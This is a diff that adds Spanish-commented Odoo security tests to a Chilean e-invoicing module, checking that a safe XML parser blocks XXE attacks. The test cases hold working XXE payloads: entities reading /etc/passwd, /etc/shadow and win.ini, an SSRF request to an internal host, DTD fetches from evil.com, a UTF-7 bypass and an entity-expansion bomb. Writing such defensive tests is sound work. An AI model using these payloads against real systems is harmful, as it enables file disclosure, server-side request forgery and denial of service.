@@ -327,3 +327,357 @@ class TestXXEProtectionSmoke(TransactionCase):
         except Exception:
             # Rechazó el XML (también es éxito)
             pass
+
+
+@tagged('post_install', '-at_install', 'security_advanced', 'xxe', 'gap_closure_p0')
+class TestXXEAdvancedAttacks(TransactionCase):
+    """
+    Test suite avanzado para vectores de ataque XXE complejos.
+
+    Cobertura de ataques sofisticados:
+    - SSRF (Server-Side Request Forgery via XXE)
+    - XXE OOB (Out-of-Band data exfiltration)
+    - XXE with parameter entities
+    - DTD injection attacks
+    - XML bomb variations
+    """
+
+    def test_09_xxe_ssrf_blocked(self):
+        """Test 09: SSRF via XXE es bloqueado (no network access)"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # SSRF payload - Intento de hacer request a servidor malicioso
+        ssrf_payload = """<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://internal-server.local/admin">
+]>
+<AUTORIZACION>
+  <CAF>
+    <DA><RE>&xxe;</RE></DA>
+  </CAF>
+</AUTORIZACION>"""
+
+        try:
+            root = fromstring_safe(ssrf_payload)
+
+            # Si parsea, verificar que NO hizo request HTTP
+            re_elem = root.find('.//RE')
+            if re_elem is not None and re_elem.text:
+                self.assertNotIn('admin', re_elem.text.lower(), 'SSRF attack NO bloqueado')
+                self.assertNotIn('http', re_elem.text.lower(), 'SSRF attack NO bloqueado')
+                self.assertNotIn('server', re_elem.text.lower(), 'SSRF attack NO bloqueado')
+
+        except (etree.XMLSyntaxError, ValueError):
+            # Parser rechazó el XML (SUCCESS)
+            pass
+
+    def test_10_xxe_parameter_entity_blocked(self):
+        """Test 10: Parameter entities XXE attack bloqueado"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # Parameter entity attack
+        parameter_entity_payload = """<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
+  %dtd;
+]>
+<root>test</root>"""
+
+        try:
+            root = fromstring_safe(parameter_entity_payload)
+
+            # Si parsea, verificar que no procesó parameter entities
+            self.assertIsNotNone(root)
+            # No debe haber cargado DTD externo ni archivo local
+
+        except (etree.XMLSyntaxError, ValueError):
+            # Parser rechazó el XML (SUCCESS - esperado)
+            pass
+
+    def test_11_xxe_utf7_encoding_attack_blocked(self):
+        """Test 11: XXE con encoding UTF-7 (bypass attempt) bloqueado"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # UTF-7 encoding bypass attempt
+        utf7_payload = """<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
++ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-"""
+
+        try:
+            # Safe parser fuerza UTF-8, debe rechazar UTF-7
+            root = fromstring_safe(utf7_payload)
+
+            # Si parsea, verificar que no es UTF-7
+            self.assertIsNotNone(root)
+
+        except (etree.XMLSyntaxError, ValueError, UnicodeDecodeError):
+            # Rechazó UTF-7 encoding (SUCCESS)
+            pass
+
+    def test_12_xxe_xml_bomb_quadratic_blowup(self):
+        """Test 12: XML Bomb - Quadratic blowup attack bloqueado"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # Quadratic blowup - Muchas referencias a misma entidad
+        quadratic_payload = """<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY a "aaaaaaaaaa">
+]>
+<root>
+  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
+  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
+  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
+  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
+  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
+</root>"""
+
+        try:
+            root = fromstring_safe(quadratic_payload)
+
+            # Si parsea, verificar que NO expandió masivamente
+            if root.text:
+                text_length = len(root.text)
+                # 50 referencias * 10 chars = 500 chars máximo
+                # Si expandió, sería mucho más
+                self.assertLess(
+                    text_length, 100,
+                    f'Quadratic blowup NO bloqueado: {text_length} chars'
+                )
+
+        except (etree.XMLSyntaxError, ValueError):
+            # Parser rechazó el XML (SUCCESS)
+            pass
+
+    def test_13_xxe_external_dtd_blocked(self):
+        """Test 13: External DTD loading bloqueado"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # External DTD reference
+        external_dtd_payload = """<?xml version="1.0"?>
+<!DOCTYPE root SYSTEM "http://evil.com/evil.dtd">
+<root>test</root>"""
+
+        try:
+            root = fromstring_safe(external_dtd_payload)
+
+            # Si parsea, verificar que NO cargó DTD externo
+            self.assertIsNotNone(root)
+            self.assertEqual(root.tag, 'root')
+
+        except (etree.XMLSyntaxError, ValueError):
+            # Rechazó external DTD (SUCCESS)
+            pass
+
+    def test_14_xxe_local_file_variations(self):
+        """Test 14: Variaciones de file:// paths bloqueadas"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # Diferentes variaciones de file paths
+        file_paths = [
+            'file:///etc/passwd',      # Linux passwd
+            'file:///etc/shadow',      # Linux shadow
+            'file:///etc/hosts',       # Hosts file
+            'file:///c:/windows/win.ini',  # Windows
+            'file://localhost/etc/passwd',  # Con localhost
+            'file:/etc/passwd',        # Sin triple slash
+        ]
+
+        for file_path in file_paths:
+            payload = f"""<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "{file_path}">
+]>
+<root>&xxe;</root>"""
+
+            try:
+                root = fromstring_safe(payload)
+
+                # Si parsea, verificar que NO expandió
+                if root.text:
+                    self.assertNotIn('root:', root.text,
+                        f'File access NO bloqueado para: {file_path}')
+                    self.assertNotIn('[boot', root.text.lower(),
+                        f'File access NO bloqueado para: {file_path}')
+
+            except (etree.XMLSyntaxError, ValueError):
+                # Rechazó el XML (SUCCESS)
+                pass
+
+    def test_15_safe_parser_config_verification(self):
+        """Test 15: Verificar configuración del SAFE_XML_PARSER"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import SAFE_XML_PARSER
+
+        # Verificar que SAFE_XML_PARSER tiene configuración correcta
+        parser = SAFE_XML_PARSER
+
+        # Debe tener resolve_entities=False
+        # NOTA: lxml XMLParser no expone directamente estos atributos,
+        # pero podemos verificar comportamiento
+
+        # Test indirecto: Parser debe rechazar/neutralizar XXE
+        xxe_test = """<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>"""
+
+        try:
+            root = etree.fromstring(xxe_test.encode('utf-8'), parser=parser)
+
+            # Si parsea, la entidad NO debe estar expandida
+            if root.text:
+                self.assertNotIn('root:', root.text,
+                    'SAFE_XML_PARSER NO tiene resolve_entities=False')
+
+        except (etree.XMLSyntaxError, ValueError):
+            # Rechazó XXE (SUCCESS - configuración correcta)
+            pass
+
+    def test_16_all_libs_use_safe_parser(self):
+        """Test 16: Verificar que todas las libs usan safe parser"""
+        import os
+        import re
+        from pathlib import Path
+
+        # Ruta a libs/
+        libs_path = Path(__file__).parent.parent / 'libs'
+
+        # Patrones inseguros
+        unsafe_patterns = [
+            r'etree\.fromstring\([^,)]+\)',  # etree.fromstring(xml) sin parser
+            r'etree\.parse\([^,)]+\)',       # etree.parse(file) sin parser
+        ]
+
+        # Archivos a revisar
+        excluded_files = {'safe_xml_parser.py', '__init__.py'}
+        python_files = [
+            f for f in libs_path.glob('*.py')
+            if f.name not in excluded_files
+        ]
+
+        violations = []
+
+        for py_file in python_files:
+            with open(py_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+
+            for line_num, line in enumerate(content.split('\n'), 1):
+                # Skip comentarios y docstrings
+                if line.strip().startswith('#') or line.strip().startswith('"""'):
+                    continue
+
+                for pattern in unsafe_patterns:
+                    if re.search(pattern, line):
+                        # Verificar si usa parser= o fromstring_safe/parse_safe
+                        if 'parser=' not in line and 'fromstring_safe' not in line and 'parse_safe' not in line:
+                            violations.append(f'{py_file.name}:{line_num}: {line.strip()}')
+
+        # Reportar violaciones
+        if violations:
+            violation_msg = '\n'.join(violations)
+            self.fail(
+                f'Uso INSEGURO de etree detectado en libs/:\n\n{violation_msg}\n\n'
+                f'TODAS las libs deben usar fromstring_safe() o parse_safe()'
+            )
+
+    def test_17_safe_parser_preserves_valid_xml(self):
+        """Test 17: Safe parser preserva XML válido correctamente"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # XML válido complejo (DTE real simplificado)
+        valid_dte = """<?xml version="1.0" encoding="UTF-8"?>
+<DTE xmlns="http://www.sii.cl/SiiDte" version="1.0">
+  <Documento ID="T33F123">
+    <Encabezado>
+      <IdDoc>
+        <TipoDTE>33</TipoDTE>
+        <Folio>123</Folio>
+      </IdDoc>
+      <Emisor>
+        <RUTEmisor>76000000-0</RUTEmisor>
+        <RznSoc>EMPRESA TEST SPA</RznSoc>
+        <GiroEmis>SERVICIOS INFORMATICOS</GiroEmis>
+      </Emisor>
+      <Receptor>
+        <RUTRecep>12345678-9</RUTRecep>
+        <RznSocRecep>CLIENTE TEST</RznSocRecep>
+      </Receptor>
+      <Totales>
+        <MntNeto>1000000</MntNeto>
+        <IVA>190000</IVA>
+        <MntTotal>1190000</MntTotal>
+      </Totales>
+    </Encabezado>
+  </Documento>
+</DTE>"""
+
+        # Parsear
+        root = fromstring_safe(valid_dte)
+
+        # Verificar estructura preservada
+        self.assertEqual(root.tag, '{http://www.sii.cl/SiiDte}DTE')
+
+        # Verificar datos preservados
+        tipo_dte = root.find('.//{http://www.sii.cl/SiiDte}TipoDTE')
+        self.assertEqual(tipo_dte.text, '33')
+
+        folio = root.find('.//{http://www.sii.cl/SiiDte}Folio')
+        self.assertEqual(folio.text, '123')
+
+        mnt_total = root.find('.//{http://www.sii.cl/SiiDte}MntTotal')
+        self.assertEqual(mnt_total.text, '1190000')
+
+    def test_18_safe_parser_handles_empty_input(self):
+        """Test 18: Safe parser maneja inputs vacíos correctamente"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe
+
+        # None input
+        with self.assertRaises(ValueError) as ctx:
+            fromstring_safe(None)
+        self.assertIn('empty', str(ctx.exception).lower())
+
+        # Empty string
+        with self.assertRaises(ValueError) as ctx:
+            fromstring_safe('')
+        self.assertIn('empty', str(ctx.exception).lower())
+
+        # Whitespace only
+        with self.assertRaises((ValueError, etree.XMLSyntaxError)):
+            fromstring_safe('   ')
+
+    def test_19_safe_parser_built_in_test(self):
+        """Test 19: Ejecutar test built-in de safe_xml_parser"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import test_xxe_protection
+
+        # Ejecutar test built-in
+        result = test_xxe_protection()
+
+        self.assertTrue(result, 'Built-in XXE protection test FAILED')
+
+    def test_20_sanitize_preserves_namespaces(self):
+        """Test 20: sanitize_xml_input preserva namespaces"""
+        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import sanitize_xml_input
+
+        # XML con namespace y DOCTYPE
+        xml_with_ns = """<?xml version="1.0"?>
+<!DOCTYPE DTE [
+  <!ENTITY xxe "malicious">
+]>
+<DTE xmlns="http://www.sii.cl/SiiDte" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <Documento>
+    <Folio>123</Folio>
+  </Documento>
+</DTE>"""
+
+        # Sanitizar
+        sanitized = sanitize_xml_input(xml_with_ns)
+
+        # Verificar que DOCTYPE fue removido
+        self.assertNotIn('<!DOCTYPE', sanitized)
+        self.assertNotIn('<!ENTITY', sanitized)
+
+        # Verificar que namespaces están intactos
+        self.assertIn('xmlns="http://www.sii.cl/SiiDte"', sanitized)
+        self.assertIn('xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"', sanitized)
+
+        # Verificar que estructura está intacta
+        self.assertIn('<Folio>123</Folio>', sanitized)
